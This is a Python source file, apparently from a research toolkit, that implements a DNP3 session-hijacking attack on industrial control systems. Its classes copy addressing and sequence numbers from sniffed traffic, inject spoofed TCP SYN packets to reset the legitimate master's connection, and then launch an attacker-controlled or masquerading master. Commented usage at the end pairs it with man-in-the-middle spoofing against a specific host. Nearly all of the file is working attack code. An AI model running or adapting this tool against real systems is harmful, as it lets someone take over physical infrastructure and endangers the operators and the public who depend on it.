from nltk.classify.rte_classify import ne

__author__ = 'Nicholas Rodofile'

from Injection import *
from DNP3_Master import *
from DNP3_Node import *
from scapy.all import IP, TCP
from DNP3_Master_Masq import *

class MasterThief(Inject):
    def __init__(self, victim):
        Inject.__init__(self)
        self.master_config = DNP3_Node(name="self", DNP3_address=0, verbose=0)
        self.running_master = False
        self.node = DNP3_Node()
        self.master = None
        self.injection[TCP].flags = 'S'
        self.injection[DNP3Transport].FIN = 0
        self.injection[DNP3Transport].FIR = 0
        self.victim = victim

    def update_injection(self, p):
        if self.running_master:
            return
        #super(MasterThief, self).update_injection(p)
        #if p.haslayer(DNP3):
        self.injection[Ether].src = p[Ether].src
        self.injection[Ether].dst = p[Ether].dst
        self.injection[IP].src = p[IP].src
        self.injection[IP].dst = p[IP].dst
        self.injection[TCP].sport = p[TCP].sport
        self.injection[TCP].dport = p[TCP].dport
        self.injection[TCP].seq = p[TCP].seq + len(p[DNP3])
        self.injection[TCP].ack = p[TCP].ack
        self.injection[DNP3].SOURCE = p[DNP3].SOURCE
        self.injection[DNP3].DESTINATION = p[DNP3].DESTINATION
        if p.haslayer(DNP3Transport):
            self.injection[DNP3].SEQUENCE = p[DNP3].SEQUENCE
            self.injection[DNP3].SEQUENCE += 1
            self.injection[DNP3ApplicationControl].SEQ = p[DNP3ApplicationControl].SEQ
            self.injection[DNP3ApplicationControl].SEQ += 1
        #self.injection.show()
        self.count += 1
        if self.count == 10:
            #slave_node_conf = self.node.Node_pkt(p, verbose=0)

            self.inject_packet()
            self.count = 0

    def connect(self):
        if not self.running_master:
            self.running_master = True
            self.master = Master(self.victim, self.injection[TCP].sport)
            self.master.address_conf(self.injection[DNP3])
            self.master.start()

    def inject_packet(self):
        for i in range(0, 3):
            self.sendp(self.injection)
            self.injection[DNP3].SEQUENCE = self.injection[DNP3].SEQUENCE + 1
            self.injection[TCP].seq =  self.injection[TCP].seq + len(self.injection[DNP3])

    def process_pkt(self, p):
        if p.haslayer(TCP):
            if p[TCP].flags == 4:
                self.connect()
                return
            if p.haslayer(DNP3):
                if p[DNP3].CONTROL.DIR == 0:
                    self.update_injection(p)

class MasterThiefMasqu(MasterThief):
    def connect(self):
        if not self.running_master:
            self.running_master = True
            self.master = DNP3_Master_Masquerading(self.victim, self.injection[TCP].sport)
            self.master.address_conf(self.injection[DNP3])
            self.master.start()



# mitm = DNP3_MITM_conf(interface='eth0')
# mitm.init_spoofing()
# victim = mitm.victim
# injector = MasterThief(victim)
#
#
# sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=100)
